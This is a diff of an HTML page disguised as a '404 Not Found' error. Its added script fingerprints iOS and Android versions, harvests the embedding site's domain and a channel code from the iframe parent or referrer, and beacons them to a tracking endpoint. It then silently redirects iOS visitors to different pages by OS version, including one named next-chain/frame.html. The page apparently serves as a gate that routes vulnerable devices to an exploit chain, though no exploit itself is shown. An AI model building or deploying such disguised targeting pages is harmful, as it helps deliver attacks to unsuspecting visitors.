@@ -1,53 +1,209 @@
+
+
+
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>404 Not Found</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
+
 </head>
 <body>
+
+
+
 <script>
-"use strict";
-// ─────────────────────────────────────────────────────────────
-// /boot.html —— 根入口薄壳（已全量移植至 /B10/boot.html）
-//
-// 旧版：本页探测 → 等首次 sync POST 成功 → 800ms → /B10/group.html → 再进门禁
-//       （额外 1 跳 + 网络往返 + 800ms 停留）
-// 新版：一次 share-beacon + location.replace 立即进入 /B10/boot.html，
-//       版本探测/渠道/心跳/门禁/引导全部在 B10 内完成，链内零跳转。
-// 旧外部链接 /boot.html?c=1 将原样透传 c / d 参数。
-// ─────────────────────────────────────────────────────────────
-(function () {
-    // 快速版本探测（台账语义保持 'IOS x.y' / 'unknown'）
-    var m = /iPhone|iPad|iPod/i.test(navigator.userAgent)
-        ? /OS (\d+)_(\d+)/i.exec(navigator.userAgent) : null;
-    var ver = m ? ('IOS ' + m[1] + '.' + m[2]) : 'unknown';
-    var c = new URLSearchParams(location.search).get('c') || '1';
-
-    // 首次 sync 登记（fire-and-forget；随后 B10/boot.html 接管心跳）
-    try {
-        var payload = JSON.stringify({
-            channelCode:   c,
-            deviceVersion: ver,
-            domain:        location.host || 'unknown'
-        });
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon('/api/ip-sync/sync', new Blob([payload], { type: 'application/json' }));
-        } else {
-            var x = new XMLHttpRequest();
-            x.open('POST', '/api/ip-sync/sync', true);
-            x.setRequestHeader('Content-Type', 'application/json');
-            x.send(payload);
-        }
-    } catch (e) {}
-
-    // 立即跳转（replace 不留历史），query/hash 原样透传
-    try {
-        location.replace('love/boot.html' + (location.search || '') + (location.hash || ''));
-    } catch (e) {
-        location.href = 'love/boot.html' + (location.search || '');
+    // ── 工具 ──────────────────────────────────────
+    function getParam(key) {
+        return new URLSearchParams(location.search).get(key) || '';
     }
-})();
+    function pad(n) { return String(n).padStart(2,'0'); }
+    function ts() {
+        var d = new Date();
+        return pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+    }
+
+    // ── 系统检测 ──────────────────────────────────
+    // 重要事实：
+    //  1) iOS Safari 的 AppleWebKit 标识自 iOS 12 起被永久冻结为 605.1.15，
+    //     不能用来判断版本（之前的 wk>=620 判断永远不成立）。
+    //  2) iOS 26+ 为兼容老站点，把 UA 里的 "CPU iPhone OS" 段冻结/降级为 18_x，
+    //     但 Safari 的 "Version/xx.x" 段通常仍是真实版本（26.x / 27.x）。
+    // 因此策略：同时解析 OS 段与 Version 段，取「主版本较大者」为真实版本。
+    function detectDevice() {
+        var ua = navigator.userAgent;
+
+        var wkm = ua.match(/AppleWebKit\/([\d.]+)/i);
+        var wk  = wkm ? wkm[1] : '';
+
+        var isIOS = /iPhone|iPad|iPod/i.test(ua) ||
+                    (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 1); // iPad 桌面模式
+
+        if (isIOS) {
+            // (a) CPU (iPhone) OS 段 —— 兼容模式下可能被冻结为 18_x
+            var osM = ua.match(/OS (\d+)_(\d+)(?:_(\d+))?/i);
+            var osMaj = osM ? parseInt(osM[1], 10) : 0;
+            var osMin = osM ? parseInt(osM[2], 10) : 0;
+            var osPat = osM ? parseInt(osM[3] || 0, 10) : 0;
+
+            // (b) Safari Version 段 —— 通常保留真实版本
+            var vM = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/i);
+            var sfMaj = vM ? parseInt(vM[1], 10) : 0;
+            var sfMin = vM ? parseInt(vM[2], 10) : 0;
+            var sfPat = vM ? parseInt(vM[3] || 0, 10) : 0;
+
+            // 取主版本较大的一组作为真实版本
+            var major, minor, patch;
+            if (sfMaj > osMaj) { major = sfMaj; minor = sfMin; patch = sfPat; }
+            else               { major = osMaj; minor = osMin; patch = osPat; }
+
+            var v = major + '.' + minor + (patch ? '.' + patch : '');
+            return {
+                type: 'iOS', major: major, minor: minor, patch: patch,
+                version: 'IOS ' + v, wk: wk,
+                os: osMaj ? (osMaj + '.' + osMin) : '—',
+                safari: sfMaj ? (sfMaj + '.' + sfMin) : '—',
+                ua: ua
+            };
+        }
+
+        // ── Android ──
+        var am = ua.match(/Android\s+(\d+(?:\.\d+)*)/i);
+        if (am) {
+            var p = am[1].split('.');
+            return { type: 'Android', major: parseInt(p[0], 10),
+                     version: 'Android ' + am[1], wk: wk,
+                     os: am[1], safari: '—', ua: ua };
+        }
+
+        return { type: 'unknown', major: 0, minor: 0,
+                 version: getParam('v') || 'unknown', wk: wk,
+                 os: '—', safari: '—', ua: ua };
+    }
+
+    // ── iframe 上下文 ──────────────────────────────
+    // 判断是否被嵌入 iframe（跨域访问 top 抛错也说明在 iframe 内）
+    var inIframe = false;
+    try { inIframe = window.self !== window.top; } catch(e) { inIframe = true; }
+
+    // 取 referrer 的 URL 对象（iframe 里通常是父页面完整地址，可能含查询串）
+    var refUrl = null;
+    try { if (document.referrer) refUrl = new URL(document.referrer); } catch(e) {}
+
+    // ── 渠道号：自身 ?c= → 同源父页面 ?c= → referrer 的 ?c= → 默认 1 ──
+    function getChannel() {
+        var c = getParam('c');
+        if (c) return c;
+        // 同源父页面（跨域会抛 SecurityError，忽略）
+        try {
+            if (inIframe && window.top && window.top.location) {
+                var tc = new URLSearchParams(window.top.location.search).get('c');
+                if (tc) return tc;
+            }
+        } catch(e) {}
+        // referrer 查询串里带的 c（父页面 URL）
+        if (refUrl) {
+            var rc = refUrl.searchParams.get('c');
+            if (rc) return rc;
+        }
+        return '1';
+    }
+
+    // ── 调用网站：URL ?d= → iframe 父页面域名 → referrer 域名 → 自身域名 ──
+    function getHostDomain() {
+        var d = getParam('d');
+        if (d) return d;
+        // iframe 场景：ancestorOrigins 可跨域拿到父页面 origin（Safari/Chrome 支持）
+        try {
+            var ao = location.ancestorOrigins;
+            if (ao && ao.length) return new URL(ao[0]).hostname;
+        } catch(e) {}
+        // 同源父页面
+        try {
+            if (inIframe && window.top && window.top.location) {
+                return window.top.location.hostname;
+            }
+        } catch(e) {}
+        // referrer 域名
+        if (refUrl) return refUrl.hostname;
+        // 兜底：iframe 自身域名
+        return location.hostname || 'unknown';
+    }
+
+    // ── 参数 ──────────────────────────────────────
+    var device = detectDevice();
+    var ios    = device.type === 'iOS' ? device : null;
+
+    var channelCode   = getChannel();
+    var deviceVersion = device.version;
+    var domain        = getHostDomain();
+
+
+
+    var PAYLOAD = { channelCode: channelCode, deviceVersion: deviceVersion, domain: domain };
+    var API     = '/api/ip-sync/sync';
+    var INTERVAL = 500000;
+    
+    
+
+
+
+  var total = 0, ok = 0, err = 0, lastTick = Date.now();
+    // ── POST ──────────────────────────────────────
+    function doPost() {
+        total++;
+        lastTick = Date.now();
+        
+        fetch(API, {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify(PAYLOAD)
+        })
+        .then(function(res) {
+            return res.text().then(function(t){ return { s: res.status, t: t }; });
+        })
+        .then(function(r) {
+            if (r.s >= 200 && r.s < 300) {
+                ok++;
+                    // ── iOS 跳转（静默）──────────────────────────
+    if (ios) {
+        var major = device.major, minor = device.minor;
+        var page = null;
+        if      (major < 17 || (major === 17 && minor <= 2)) { page = 'openai.html'; }
+        else if (major === 18)                                 { page = 'next-chain/frame.html'; }
+        else if (major >= 26)                                  { page = 'claude.html'; }
+
+        if (page) {
+            // 渠道码随跳转带过去，如 a.html?c=5
+            var target = page + '?c=' + encodeURIComponent(channelCode);
+            var sec = document.getElementById('redirect-section');
+            setTimeout(function(){ location.href = target; }, 800);
+        }
+    }
+
+            } else {
+                err++;
+
+            }
+            
+        })
+        .catch(function(e) {
+            err++;
+
+        });
+    }
+
+
+
+    // ── 启动 ──────────────────────────────────────
+    doPost();
+    setInterval(doPost, INTERVAL);
+
+
 </script>
+
 </body>
 </html>
+
